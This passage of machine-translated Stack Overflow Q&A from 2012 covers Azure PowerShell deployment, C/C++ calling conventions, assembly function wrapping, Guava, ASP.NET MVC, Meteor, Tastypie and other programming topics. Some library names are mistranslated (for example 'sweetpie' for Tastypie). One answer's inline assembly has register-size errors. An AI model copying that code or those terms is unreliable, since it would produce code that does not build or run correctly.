我在 2012 年 10 月发布的 cmdlet 中遇到了同样的问题。打开支持票，他们表示这是一个已知问题，并指出我在 8 月发布以解决错误 - [https://github.com/WindowsAzure/azure-sdk-tools/downloads](https://github.com/WindowsAzure/azure-sdk-tools/downloads)。在卸载十月构建并安装八月一之后，部署开始按预期工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T04:03:10.587

我是 AzurePowerShell 的新手，但我也有类似的问题，我只是通过以下方式欺骗它：

1.  将插槽设置​​为暂存
2.  删除当前部署（如果存在）
3.  创建一个新的部署
4.  交换它

这是我的 PowerShell 脚本（修改自：[http](http://weblogs.asp.net/srkirkland/archive/2012/09/11/ci-deployment-of-azure-web-roles-using-teamcity.aspx) ://weblogs.asp.net/srkirkland/archive/2012/09/11/ci-deployment-of-azure-web-roles-using-teamcity.aspx ）

```
$subscription = "[Your Subscription Name]"
$service = "[Your Service Name]"
$slot = "staging" 
$package = "[Your Package File]"
$configuration = "[Your Config File]"
$timeStampFormat = "g"
$deploymentLabel = "ContinuousDeploy to $service v%build.number%"
$storageaccount = "[Your Storage Account Name]"

Write-Output "Running Azure Imports"
Import-Module "C:\Program Files (x86)\Microsoft SDKs\Windows   Azure\PowerShell\Azure\*.psd1"
Import-AzurePublishSettingsFile "[Your publishsettings file]"
Set-AzureSubscription -SubscriptionName $subscription -SubscriptionId "[Your   Subscription Id]" -CurrentStorageAccount $storageaccount
Set-AzureSubscription -DefaultSubscription $subscription

function Publish(){
 $deployment = Get-AzureDeployment -ServiceName $service -Slot $slot -ErrorVariable a -  ErrorAction silentlycontinue 

 if ($a[0] -ne $null) {
    Write-Output "$(Get-Date -f $timeStampFormat) - No deployment is detected. Creating  a new deployment. "
 }

 if ($deployment.Name -ne $null) {
    Write-Output "$(Get-Date -f $timeStampFormat) - Deployment exists in $servicename.   Upgrading deployment."
    Remove-AzureDeployment -Slot $slot -ServiceName $service -Force
 } 

 CreateNewDeployment
 Move-AzureDeployment -ServiceName $service
 }

function CreateNewDeployment()
{
    write-progress -id 3 -activity "Creating New Deployment" -Status "In progress"
    Write-Output "$(Get-Date -f $timeStampFormat) - Creating New Deployment: In   progress"

    $opstat = New-AzureDeployment -Slot $slot -Package $package -Configuration    $configuration -Label $deploymentLabel -ServiceName $service

    $completeDeployment = Get-AzureDeployment -ServiceName $service -Slot $slot
    $completeDeploymentID = $completeDeployment.deploymentid

    write-progress -id 3 -activity "Creating New Deployment" -completed -Status "Complete"
    Write-Output "$(Get-Date -f $timeStampFormat) - Creating New Deployment: Complete,    Deployment ID: $completeDeploymentID"
}

Write-Output "Create Azure Deployment"
Publish 
```

它正在工作:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T19:28:43.183

我遇到了类似的问题。当我将 cspkg 独立上传到 blob 存储并使用 -Package {url-to-blob} 引用它时，升级就成功了。

我想这可能意味着它无法上传 blob 本身，因为某些设置错误，但很难说那会是什么。

你是如何捕捉到内部异常的？

# php - 写 If (Function) {return function} 会执行两次函数吗？

> ID：13313516
> 
> 赞同：-3
> 
> 时间：2012-11-09T18:03:27.060
> 
> 标签：php

在 PHP 中，如果我写类似的东西

```
If ($this->that()){ return $this->that()} 
```

它会执行`$this->that()`两次吗？或者该解析器是否弄清楚并将其减少到 1 个调用？

如果可能，尽量保持代码干净，但不想为了一个变量分配而将执行时间加倍。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-09T18:06:06.670

是的，它执行了两次。

为了让它执行一次，你应该将它的值保存到一个变量中并返回该变量：

```
if ($value = $this->that()) {
    return $value;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:05:40.787

如果你调用该函数两次，它会评估两次。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:07:17.010

它肯定会执行两次。

也许您正在寻找[function_exists](http://php.net/manual/en/function.function-exists.php)？我不确定您的`if`语句是否旨在确定该函数是否存在或不返回 false。

# c++ - 来自 dll 的 c++ 回调

> ID：13313517
> 
> 赞同：0
> 
> 时间：2012-11-09T18:03:29.150
> 
> 标签：c++, dll

我有以下用于制作 dll 的 c++ 代码（只是其中的一部分）：

```
 #include <windows.h>
    #include <stdint.h>

    using namespace std;

    typedef int (__stdcall *event)(unsigned int id, int value);

    BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwFunction, LPVOID lpReserved);

    namespace Bla
    {
      class blubb
      {
        public:         
        static __declspec(dllexport) void setCallback(event evnHnd);
      };
    } 
```

现在我想将该 dll 链接到另一个 c++ 代码中。因此我使用该代码：

```
typedef int (__stdcall *event)(unsigned int id, int value);
typedef void (__stdcall *setCallback)(eventCallback evHnd);

int __stdcall valuesDll( unsigned int id, int value)
{
std::cout << "id::value == " << id << "::" << value << std::endl;
return 0;
}

int _tmain()
{

HINSTANCE hDLL = LoadLibrary(_T("test"));
if(hDLL == NULL)
{
    std::cout << "dll not loaded.\n";
}
else
{
    std::cout << "DLL loaded.\n";
    setCallback values = (setCallback)GetProcAddress(hDLL, "setCallback");

    if(NULL != values)
    {   
        values(&valuesDll);
    }

    FreeLibrary(hDLL);
}
return 0;
} 
```

但现在我得到了错误：

ESP 的值未在函数调用中正确保存。这通常是调用使用一种调用约定声明的函数和使用另一种调用约定声明的函数指针的结果。

为什么？非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:14:15.127

`blubb::setCallback`默认为`__cdecl`并且您将其称为`__stdcall`. 尝试在您的 DLL 中将其声明为：

```
static __declspec(dllexport) void __stdcall setCallback(event evnHnd); 
```

# nsis - NSIS：组合框的 nsDialogs 滚动窗格

> ID：13313518
> 
> 赞同：2
> 
> 时间：2012-11-09T18:03:47.637
> 
> 标签：nsis, nsdialogs

我想使用类似于 MUI 中的组件页面的 nsDailogs 创建一个自定义页面。它应该有一个包含复选框列表的滚动部分。该列表将根据计算机上已安装的程序在运行时填充。我想包括滚动窗格，因为列表可能会变得太长而无法在屏幕上显示。

有什么方法可以创建一个 ListBox 并向其中添加 CheckBoxes，类似于向其中添加字符串？将字符串添加到 ListBox 的论坛主题：[http ://forums.winamp.com/showthread.php?threadid=276367](http://forums.winamp.com/showthread.php?threadid=276367)

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:27:24.660

列表框不支持复选框，但[列表视图](http://nsis.sourceforge.net/EmbeddedLists_plug-in)控件确实支持复选框。[你可以在 wiki 上](http://nsis.sourceforge.net/Header_file_for_Listview)找到它的头文件，还有[一个插件](http://nsis.sourceforge.net/EmbeddedLists_plug-in)你可以看看。

也可以通过在列表视图或树视图中使用图像列表来模拟复选框。（NSIS 这样做是因为 Win95 不支持本机列表视图复选框）

# c++ - basic_string 等效的单元测试

> ID：13313522
> 
> 赞同：2
> 
> 时间：2012-11-09T18:03:58.370
> 
> 标签：c++, string, testing, stdstring

我正在完成定制字符串类的开发。当然，它旨在等同于 basic_string ，并为其预期目的定制内部存储。我正在寻找一个测试工具，可以让它通过与 C++ 标准相关的步伐。我已经看到 libstdc++ 有一个测试套件。但是，我一直找不到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:10:55.480

许可问题和所有无法承受的问题，您始终可以将 libc++[测试用例用于 strings](http://llvm.org/svn/llvm-project/libcxx/trunk/test/strings/)。测试系统基于 CMake，非常易于理解/集成。

# oracle - Oracle：使用多连接全选时如何检索表名

> ID：13313526
> 
> 赞同：0
> 
> 时间：2012-11-09T18:04:17.077
> 
> 标签：oracle, pdo

我有一个包含很多连接的查询，使我的总列数超过 1000。为了解决这个限制，我需要使用 select * 而不是手动定义别名。

我想要做

```
SELECT    *
FROM      table0 t0
INNER JOIN table1 t1
ON         t0.field = t1.field
WHERE      rownum < 10 
```

在我的结果中，我需要在列名中定义以下内容

```
t0.column
t0.column2
t1.column
t1.column2 
```

是否有我缺少的概念或技术来实现这一点？我真的不想依赖现场顺序，因为它可能会改变。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:32:43.147

也许你可以提出一个提示：

```
SELECT t1.*, 't1 <-> t2' , t2.*,  't2 <-> t3', t3.* 
```

现在你最终会看到这样的东西：

```
 t1...................................|           | t2................|           | t3.....................|
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... |
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... |
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... |
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... |
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... |
 01-02-2012 | ... | More data from t1 | t1 <-> t2 | Some data from t2 | t2 <-> t3 | Now data from t3 | ... | 
```

而且您知道这些标记之间的所有内容都`'t1 <-> t2'`属于表格。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:09:56.783

您可以执行以下操作：

```
SELECT t0.column, t0.column2, t1.column, t1.column2, t0.*, t1.* 
FROM      table0 t0
INNER JOIN table1 t1
ON         t0.lm_mst_uid = t1.lm_mst_uid
WHERE      rownum < 10 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:13:28.727

```
SELECT    t0.*, t1.*
FROM      table0 t0
INNER JOIN table1 t1
ON         t0.lm_mst_uid = t1.lm_mst_uid
WHERE      rownum < 10 
```

# c - 一种在不知道签名的情况下包装 C 函数调用的方法？

> ID：13313530
> 
> 赞同：2
> 
> 时间：2012-11-09T18:04:28.713
> 
> 标签：c, linux, function, gcc, assembly

给定一个带有 C 绑定和任意签名的函数，创建一个指向该函数的指针、传递它、包装它并调用它是一件简单的事情。

```
int fun(int x, int y)
{
   return x + y;
}
void* funptr()
{
   return (void*)&fun;
}
int wrapfun(int x, int y)
{
   // inject additional wrapper logic
   return ((int (*)(int, int))funptr())(x, y);
} 
```

只要调用者和被调用者遵循相同的调用约定并就签名达成一致，一切正常。

现在假设我想包装一个包含数千个函数的库。我可以使用`nm`或`readelf`获取要包装的所有函数的名称，但我宁愿不必关心签名，甚至不需要包含库的关联头文件。

在某些情况下，考虑到版本和平台之间发生的外观变化，干净地包含标题可能不是一种选择。例如：

```
// from openssl/ssl.h v0.9.8
SSL_CTX* SSL_CTX_new(SSL_METHOD* meth);
// from openssl/ssl.h v1.0.0
SSL_CTX* SSL_CTX_new(const SSL_METHOD* meth); 
```

* * *

这是我的背景理由，你可以离开或接受。无论如何，我的问题是：

有没有办法写

```
// pseudocode
void wrapfun()
{
    return ((void (*)())funptr())();
} 
```

这样的调用者`wrapfun`知道 的签名`fun`，但`wrapfun`自己不必知道？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T18:04:28.713

如果您查看从编译的 C 函数生成的程序集，您会看到每个函数体都由

```
pushq %rbp
movq  %rsp, %rbp
; body
leave
ret 
```

[http://en.wikipedia.org/wiki/X86_instruction_listings](http://en.wikipedia.org/wiki/X86_instruction_listings)将该`leave`指令列为 80186 等效项（在 AT&T 语法中）

```
movq  %rbp, %rsp
popq  %rpb 
```

`leave`前两行也是如此：保存调用者的堆栈帧并创建我们自己的堆栈帧，然后在最后展开。

关闭`ret`是`call`我们到这里的反面，[http://www.unixwiz.net/techtips/win32-callconv-asm.html](http://www.unixwiz.net/techtips/win32-callconv-asm.html)显示了在这些配对指令期间发生的指令指针寄存器的隐藏推送和弹出。

void 函数指针调用本身不起作用的原因是`wrapfun`编译器为函数创建的这个程序集。我们需要做的是以这样一种方式创建包装器：它可以将调用者为其设置的堆栈帧直接交给 的调用`fun`，而不会妨碍它自己的堆栈帧。换句话说，遵守 C 调用约定并同时违反它。

考虑一个 C 原型

```
int wrapfun(int x, int y); 
```

与组装实现配对（AT&T x86_64）

```
 .file "wrapfun.s"
  .globl wrapfun
  .type   wrapfun, @function
wrapfun:
  call    funptr
  jmp     *%rax
  .size   wrapfun, .-wrapfun 
```

基本上，我们跳过了典型的堆栈指针和基指针操作，因为我们希望`fun`' 的堆栈看起来与我的堆栈完全一样。调用`funptr`将创建他自己的堆栈空间并将他的结果保存到 register `RAX`。因为我们没有自己的堆栈空间，并且因为我们的调用者`IP`很好地坐在堆栈的顶部，所以我们可以简单地无条件跳转到被包装的函数，并让他`ret`一直跳转回来。以这种方式，一旦函数指针被调用，他将看到调用者设置的堆栈。

如果我们需要使用局部变量，将参数传递给`funptr`等，我们总是可以设置我们的堆栈，然后在调用之前将其拆除：

```
wrapfun:
  pushq   %rbp
  movl    %rsp, %rbp ; set up my stack
  call    funptr
  leave              ; tear down my stack
  jmp     *%rax 
```

或者，我们可以将这个逻辑嵌入到内联汇编中，利用我们对编译器前后做什么的了解：

```
void wrapfun()
{
    void* p = funptr();
    __asm__(
        "movq -8(%rbp), %rax\n\t"
        "leave\n\t"
        "popq %rbx\n\t"
        "call *%rax\n\t"
        "pushq %rbx\n\t"
        "pushq %ebp\n\t"    // repeat initial function setup
        "movq %rsp, %rbp"   // so it can be torn down correctly
    );
} 
```

这种方法的优点是在魔术之前更容易声明 C 局部变量。最后声明的局部变量将在 RBP-sizeof(var) 中，我们在拆除堆栈之前将其保存在 RAX 中。另一个可能的好处是有机会使用 C 预处理器来内联 32 位或 64 位汇编，而无需单独的源文件。

**编辑：**缺点是现在需要将 IP 保存到寄存器中，通过要求`RBX`调用者不使用来限制应用程序的可移植性。

简而言之，答案是肯定的。如果您愿意弄脏自己的手，绝对可以在不知道其签名的情况下包装函数。没有关于可移植性的承诺；）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:21:06.033

除了[Ryan 的回答](https://stackoverflow.com/a/13313531/841108)之外，您还应该考虑使用[libffi](http://sourceware.org/libffi/)（*外部函数接口库*，可能在您的 GCC 编译器中）。它适合您的目标，并“可移植地”抽象细节（对于它支持的许多架构、系统和 ABI）。

# java - Guava CacheLoader - 如果 expireAfterWrite 和 expireAfterAccess 都设置了，invalidate 不会立即使条目无效

> ID：13313533
> 
> 赞同：1
> 
> 时间：2012-11-09T18:04:32.267
> 
> 标签：java, guava

例如：

```
CacheBuilder.newBuilder()
            .maximumSize(1000)
            .expireAfterAccess(1, TimeUnit.MINUTES)
            .expireAfterWrite(1, TimeUnit.MINUTES)
            .build(new CacheLoader<String, Object>() {
                @Override
                public Object load (String key) {
                    return ...;
                }
            }); 
```

如果调用`invalidate(key)`返回的实例，随后的调用`getUnchecked()`将始终使用先前的值，直到至少 1 分钟过去，因为它会`load(key)`再次调用。调用`cleanUp()`right after`invalidate()`似乎也没有效果。

我是在错误地使用此功能还是不了解缓存的工作原理？

根据[http://code.google.com/p/guava-libraries/wiki/CachesExplained](http://code.google.com/p/guava-libraries/wiki/CachesExplained)：

> “在任何时候，您都可以显式地使缓存条目无效，而不是等待条目被驱逐。这可以做到：
> 
> 单独使用 Cache.invalidate(key)"

我会假设调用 invalidate 将优先并且总是使条目有资格被驱逐（即，下一个 getUnchecked 调用），即使时间少于 1 分钟。

编辑:: 我想出了我的问题。上面的观察确实是真实的并且是缓存的预期性质。但是，我的具体问题是，当我真的需要在没有参数的情况下调用 invalidateAll() 时（这会使所有内容无效），我有时会使用空列表（这不会使任何内容无效）调用 invalidateAll([])。我几乎希望 invalideAll([]) 等同于 invalidateAll()，但我可以看到这会导致一些混乱。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:10:51.320

...我不清楚您是在描述您的期望还是您的观察，但`invalidate`应该立即删除该条目 - 而不是等待另一个查询 - 并且应该强制该值在下一个查询时重新加载到该键. 如果这不是发生的情况，那么这是一个错误。

# c# - MVC 3 问题中的嵌套视图

> ID：13313538
> 
> 赞同：0
> 
> 时间：2012-11-09T18:05:08.583
> 
> 标签：c#, asp.net-mvc-3

我无法在我的 MVC 3 架构中设置一些嵌套视图。这是我目前拥有的：

```
_Layout.cshtml
    Logon.cshtml
        Login.cshtml
        ForgotPassword.cshtml 
```

所以基本上，我的 _Layout.cshtml 页面只是我的母版页。然后我有Logon.cshtml。这充当我登录页面的“母版页”。在此之下，我有两个部分视图，Login.cshtml 和 ForgotPassword.cshtml。在这一切的背后，我有一个名为 AccountController 的控制器。首先，让我向您展示 Logon.cshtml

视图/帐户/Logon.cshtml

```
@model Coltrane.Web.Website.Models.Account.LogonViewModel
@{
    Layout = "~/Views/Shared/_Layout.cshtml";
    ViewBag.Title = "Logon";
}
@*@this.CssIncludes(@Url.Content("~/Content/login.css"))*@
@this.ScriptIncludes(@Url.Content("~/Content/scripts/Account/logon.js"))
@this.InitFunctionIncludes("lga_loginTabs.init()")
@this.InitFunctionIncludes("lga_formFocus.init()")
<div id="container">
    <div class="sectionFocus noBg">
        <div style="margin: 24px auto; width: 450px;">
            <div class="customerLogo" style="margin: 24px auto;">
                logo
            </div>
            <div id="tabContainer" style="position: relative; width:100%;">
                <div id="login" class="box_c" style="position:absolute; width:100%;">
                    <h1>User Login</h1>
                    <div class="box_c_content">
                        <div class="sepH_c">
                            @{ Html.RenderAction("Login", "Account"); }
                            <a href="#" id="gotoFogot">Forgot your password?</a>
                        </div>
                    </div>
                </div>
                <div id="forgot" class="box_c" style="position: absolute; width:100%;display: none;">
                    <h1>Forgot Your Password?</h1>
                    <div class="box_c_content">
                        <div class="sepH_c">
                            @{ Html.RenderAction("ForgotPassword", "Account"); }
                            <a href="#" id="gotoLogin">Back to Login</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div> 
```

请注意，我已经使用 Html.RenderAction 渲染了 Login 和 ForgotPassword 部分视图。我这样做是因为它们中的每一个实际上都是表单，它们需要发布到 AccountController。接下来，让我向您展示我的 Login.cshtml 文件：

视图/帐户/Login.cshtml

```
@model Coltrane.Web.Website.Models.Account.LoginViewModel
@{
    Layout = null;
}
@this.ScriptIncludes(@Url.Content("~/Content/scripts/Account/login.js"))
@this.InitFunctionIncludes("login.init()")
<div class="sepH_a">
    <label>
        Please enter your email and password to log into the system.</label>
</div>
@using (Html.BeginForm("Login", "Account", FormMethod.Post, new { id = "form_login" }))
{
    <div class="sepH_a">
        <div class="loginError">
            @Html.ValidationSummary(true, "Login was unsuccessful. Please correct the errors and try again.")
            @Html.ValidationMessageFor(m => m.UserName)<br />
            @Html.ValidationMessageFor(m => m.Password)
        </div>
    </div>
    <div class="sepH_a">
        @Html.LabelFor(m => m.UserName, new { @class = "lbl_a" })
        <br />
        @Html.TextBoxFor(m => m.UserName, new { @class = "inpt_a_login", id = "lusername", name = "lusername" })
        <span class="inputReqd" style="visibility: visible;">*</span>
    </div>
    <div class="sepH_a">
        @Html.LabelFor(m => m.Password, new { @class = "lbl_a" })
        <br />
        @Html.PasswordFor(m => m.Password, new { @class = "inpt_a_login", id = "lpassword", name = "lpassword" })
        <span class="inputReqd" style="visibility: visible;">*</span>
    </div>
    <div class="sepH_a">
        @Html.CheckBoxFor(m => m.RememberMe, new { @class = "input_c", id = "remember" })
        @Html.LabelFor(m => m.RememberMe, new { @class = "lbl_c" })
    </div>

     <div class="box_c_footer">
        <button class="sectB btn_a" type="submit">
            Login</button>
    </div>
} 
```

如您所见，这只是一个简单的形式。需要注意的一件事是，我在这里尝试使用两个模型。每个视图一个。一个用于父视图，一个用于两个子视图（forgotpassword 也有一个）。不管怎样，让我给你看看我的 AccountController

控制器/AccountController.cs

```
 public class AccountController : Controller
    {
        private IAuthenticationService _authenticationService;
        private ILoggingService _loggingService;

        public AccountController(IAuthenticationService authenticationService,
            ILoggingService loggingService)
        {
            _authenticationService = authenticationService;
            _loggingService = loggingService;
        }

        public ActionResult Logon()
        {
            return View();
        }

        [HttpGet]
        [ChildActionOnly]
        public ActionResult Login()
        {
            return PartialView();
        }

        [HttpPost]
        public ActionResult Login(LoginViewModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                if (Membership.ValidateUser(model.UserName, model.Password))
                {
                    FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);
                    if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                        && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                        return RedirectToAction("Index", "Home");
                    }
                }
                else
                {
                    ModelState.AddModelError("", "The user name or password provided is incorrect.");
                }
            }
            else
            {
                ModelState.AddModelError("", "An error has occurred.");
            }

            // If we got this far, something failed, redisplay form
            return View("Logon");
            // return View(model)
            // return RedirectToAction("Index", "Home");
        }
        //........
    } 
```

在方法 [HttpPost] Login(...) 上，我正在检查用户的信用是否正确。如果是这样，一切正常，但问题出在错误上。如果我使用`return View("Logon");`，我认为我会得到一个无限循环，如果我使用`return View(model)`我会得到 Login.cshtml 的部分视图，如果我使用`return RedirectToAction("Index", "Home");`，我会正确返回到我的登录视图，但我添加的错误不会显示（当 i 时它们确实出现了`return View(model);`。我在这里做错了什么？我认为我的设置是有道理的，但我无法弄清楚如何使其正常工作。我希望返回以呈现 Logon.cshtml 视图错误。为了完整起见，这里是我提供的视图的两个 ViewModel：

```
public class LogonViewModel
{
}

public class LoginViewModel
{
    [Required]
    [Display(Name = "Email")]
    public string UserName { get; set; }

    [Required]
    [DataType(DataType.Password)]
    [Display(Name = "Password")]
    public string Password { get; set; }

    [Display(Name = "Remember Me?")]
    public bool RememberMe { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:12:41.377

在我看来，处理此问题的最佳方法是重定向回索引页面。但是正如您所提到的，这会导致您的错误丢失。

不过，有一个很好的解决方案 - 将模型状态保存在 TempData 中，然后在索引页面上重新导入。这是一个链接，它提供了几个不错的属性，您可以使用它来使其非常无缝：`[ImportModelStateFromTempData]`和`[ExportModelStateToTempData]`

[http://weblogs.asp.net/rashid/archive/2009/04/01/asp-net-mvc-best-practices-part-1.aspx#prg](http://weblogs.asp.net/rashid/archive/2009/04/01/asp-net-mvc-best-practices-part-1.aspx#prg)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:47:10.233

我认为问题在于您使用的方法。

```
@Html.RenderAction("Login", "Account") 
```

将始终调用 GET Login，它没有与之关联的数据。

尝试使用：

```
@Html.RenderPartial("Login","Account", Model.LoginModel) 
```

其中 Model 是 LogonViewModel，LoginModel 是 LoginViewModel。

您的 LogonViewModel 将变为：

```
public class LogonViewModel
{
    public LoginViewModel LoginModel { get; set; }
} 
```

然后在您的 AccountController 中，您可以执行以下操作：

```
 var logonModel = new LogonViewModel();
    logonModel.LoginModel = model;

    return View("Logon", logonModel); 
```

# meteor - Meteor 应用程序在启动时崩溃

> ID：13313540
> 
> 赞同：2
> 
> 时间：2012-11-09T18:05:24.010
> 
> 标签：meteor

今天早上开发时莫名其妙地开始崩溃。现在运行任何流星命令都会返回：

```
module.js:340
    throw err;
          ^
Error: Cannot find module 'combined-stream'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:362:17)
    at require (module.js:378:17)
    at Object.<anonymous> (/usr/local/meteor/lib/node_modules/request/node_modules/form-data/lib/form_data.js:1:84)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:362:17) 
```

原来的崩溃日志是：

```
Your app is crashing. Here's the latest log.

/usr/local/meteor/lib/node_modules/fibers/fibers.js:13
    throw new Error('`'+ modPath+ '.node` is missing. Try reinstalling `node-fibe
          ^
Error: `/usr/local/meteor/lib/node_modules/fibers/bin/darwin-x64-v8-3.11/fibers.node` is missing. Try reinstalling `node-fibers`?
    at Object.<anonymous> (/usr/local/meteor/lib/node_modules/fibers/fibers.js:13:8)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:362:17)
    at require (module.js:378:17)
    at Object.<anonymous> (/Users/andrei/Dropbox/CodeRookMeteor/coderookmeteor/.meteor/local/build/server/server.js:3:1)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
Exited with code: 1
Your application is crashing. Waiting for file change. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T18:51:30.350

我尝试重新启动 MongoDB，但没有成功。我还尝试将所有代码拉下来。问题似乎出在 Meteor 上。重新安装它工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-11-16T09:12:28.397

运行`meteor create project_name`命令后将目录更改为项目`cd project_name`然后而不是直接运行`meteor`命令运行`meteor npm install`然后运行`meteor`命令。

这是官方文档的片段 -[链接](https://www.meteor.com/tutorials/blaze/creating-an-app/%22Link%22)：

```
cd simple-todos
meteor npm install
meteor 
```

# playframework - 运行时不自动编译播放框架 2.0

> ID：13313541
> 
> 赞同：0
> 
> 时间：2012-11-09T18:05:27.007
> 
> 标签：playframework, playframework-2.0

无论如何要运行我的项目，以便每次我更新它不会自动编译的东西？

我有一个朋友在同一个网络上，我想测试应用程序，但我不想让他看到我正在做的当前更改。也许像

```
play "run static" 
```

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T18:09:34.933

您可以“在后台启动应用程序”

```
play start 
```

[http://www.playframework.org/documentation/1.2/cheatsheet/commandLine](http://www.playframework.org/documentation/1.2/cheatsheet/commandLine)

# django - 美味派过滤

> ID：13313545
> 
> 赞同：1
> 
> 时间：2012-11-09T18:05:38.807
> 
> 标签：django, filtering, tastypie

我开始使用 Django 和 sweetpie 来与我的数据库进行交互。

所以我有一个包含许多表的数据库，我可以设置过滤，这样我就可以使用这样的 URL，使用相关 Django 对象的链来过滤我的结果。

```
api/seq/mapping/?loadedwith__lane__flowcell__name=C16P5ACXX&loadedwith__lane__lane=8 
```

映射资源设置如下：

```
class MappingResource(ModelResource):
    loadedwith = fields.ToOneField('sequencing.api.LoadedWithResource' , 'loadedwith' ) 
    class Meta:
        queryset = Mapping.objects.all()
        resource_name = 'mapping'
        allowed_methods = ['get' , 'post' , 'put' , 'patch' ,  'delete']
        authorization = Authorization()                        
        serializer = PrettyJSONSerializer()
        filtering = {
            'loadedwith': ALL_WITH_RELATIONS,
            'reference_filename' : ALL
        } 
```

正如我所期望的那样，这一切都很好。

现在，当我弄乱 URL 时，我注意到了一个问题。如果我错过了链上加载的对象之一，例如

```
loadedwith__lane__lane=8 
```

而是使用

```
lane__lane=8 
```

所以网址最终为：

```
api/seq/mapping/?loadedwith__lane__flowcell__name=C16P5ACXX&loadedwith__lane__lane=8 
```

现在这将返回由第一部分过滤的结果：

```
loadedwith__lane__flowcell__name=C16P5ACXX 
```

但基本上忽略了第二部分

```
lane__lane=8 
```

我原以为它会抛出错误，或者不返回任何东西。有没有办法配置tastepie在这种情况下抛出错误？（或者由于某种我不知道的原因，这是一种预期的行为）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T19:22:36.600

默认的 sweetpie 行为是忽略不匹配字段 [1] 的过滤器。

改变这种行为的唯一方法是覆盖`ModelResource build_filters()`方法。

[1] [https://github.com/toastdriven/django-tastypie/blob/master/tastypie/resources.py#L1784](https://github.com/toastdriven/django-tastypie/blob/master/tastypie/resources.py#L1784)

# iphone - 胖静态库：找不到架构 armv7 的符号？

> ID：13313550
> 
> 赞同：1
> 
> 时间：2012-11-09T18:05:49.540
> 
> 标签：iphone, objective-c, static-libraries

我有以下问题：我有一个与 armv7 兼容的项目。对于新 iPhone，我不得不为 armv7s 重新编译所有库（包括 boost 库）。**这些库仅包含 C++ 代码！**每个库都向我显示以下消息：

**胖文件中的架构：/Users/zhivkobogdanov/Library/Developer/Xcode/DerivedData/CollDet-fqaizyeeisynwqfqfznxlzxpaghu/Build/Products/Debug-iphoneos/libColl.a 是：armv7 (cputype (12) cpusubtype (11)) i386**

这意味着每个静态库都是与 armv7、armv7s 和模拟器兼容的胖库。问题是当我尝试使用任何库时收到以下错误消息：

**未找到架构 armv7 的符号**

坦率地说，这很奇怪......

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T12:51:14.087

对于所有想知道解决方法的人：我改变了

**C++ 语言方言**到**GNU++11**

和

**C++ 标准库**到**libc++**

这没有产生任何错误并且编译没有任何问题。

# reporting-services - 如何在不下载的情况下通过 URL 将 SSRS 报告呈现为图像

> ID：13313551
> 
> 赞同：1
> 
> 时间：2012-11-09T18:05:55.077
> 
> 标签：reporting-services, sql-server-2012, ssrs-2012

使用 SSRS，我们可以通过 URL 直接执行报告，甚至以特定格式导出报告。我已经设置了一个报告，我试图将其导出为图像，效果很好。

例如：

```
http://myserver/ReportServer?http://myserver/DynamicImageTest.rdl&Keyword=test&rs:Command=Render&rs:Format=IMAGE&rc:OutputFormat=PNG 
```

但是，因为 SSRS 设置了 header `Content-Disposition: attachment`，所以我的浏览器总是下载图像，而不是内联显示它。

我正在尝试将生成的图像嵌入到其他地方，所以我需要能够删除或抑制这种行为。

有什么方法可以做到这一点，要么使用 SSRS 的内置 URL 参数或一些解决方法，还是我需要通过 Web 服务运行报告来执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-11-04T17:01:45.183

这个解决方案对我有用，但仍然存在图形/趋势的渲染问题：

您需要使用 javascript 将您的请求嵌入到这样的 html 页面中：

```
function updateImage()
 {
    if(newImage.complete) {    
    newImage = new Image();
